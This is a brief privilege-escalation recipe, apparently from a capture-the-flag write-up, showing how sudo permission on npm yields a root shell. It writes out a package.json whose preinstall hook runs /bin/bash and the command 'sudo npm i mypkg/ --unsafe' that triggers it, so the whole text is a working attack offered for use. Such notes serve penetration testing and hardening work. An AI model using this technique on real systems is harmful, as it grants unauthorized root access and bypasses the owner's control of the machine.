##### Instaling package for escalation with npm sudo
```js
Write package as:  
  
algernon@holiday:/dev/shm$ cat mypkg/package.json   
{  
  "name": "root_please",  
  "version": "1.0.0",  
  "scripts": {  
    "preinstall": "/bin/bash"  
  }  
}  
  
Now just give it a run for install package and get the root:  
  
algernon@holiday:/dev/shm$ sudo npm i mypkg/ --unsafe
```
